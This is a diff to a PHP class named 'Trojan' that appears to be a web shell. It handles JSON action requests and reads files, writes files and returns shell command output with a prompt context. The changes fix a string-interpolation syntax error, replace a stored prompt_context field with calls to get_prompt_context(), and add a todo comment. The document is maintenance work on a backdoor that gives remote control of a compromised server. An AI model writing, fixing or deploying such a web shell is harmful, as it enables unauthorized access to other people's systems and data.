@@ -16,6 +16,7 @@ class Trojan{
         $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
 
         # require that a context always be set
+        # @todo: do I need this?
         $this->response['prompt_context'] = $this->get_prompt_context();
     }
 
@@ -41,9 +42,9 @@ class Trojan{
             # if the method doesn't exist, send back an error message
             else {
                 $this->response = array(
-                    'error'          => "{$json['action'])} unsupported.",
-                    'output'         => "{$json['action'])} unsupported.",
-                    'prompt_context' => $this->prompt_context,
+                    'error'          => "{$json['action']} unsupported.",
+                    'output'         => "{$json['action']} unsupported.",
+                    'prompt_context' => $this->get_prompt_context(),
                 );
                 $this->send_response();
             }
@@ -144,7 +145,7 @@ class Trojan{
         if(!is_readable($args['file'])){
             $this->response = array(
                 'error'          => 'File is not readable or does not exist.',
-                'prompt_context' => $this->prompt_context,
+                'prompt_context' => $this->get_prompt_context(),
             );
             $this->send_response();
         }
@@ -158,7 +159,7 @@ class Trojan{
         );
         $this->response = array(
             'output'         => $output,
-            'prompt_context' => $this->prompt_context,
+            'prompt_context' => $this->get_prompt_context(),
         );
         $this->send_response();
     }
@@ -172,7 +173,7 @@ class Trojan{
         # assemble a response
         $this->response = array(
             'output'         => $out,
-            'prompt_context' => $this->prompt_context,
+            'prompt_context' => $this->get_prompt_context(),
         );
 
         $this->send_response();
@@ -193,7 +194,7 @@ class Trojan{
         else {
             $this->response['output'] = 'Write successful.';
         }
-        $this->response['prompt_context'] = $this->prompt_context;
+        $this->response['prompt_context'] = $this->get_prompt_context();
         $this->send_response();
     }
 
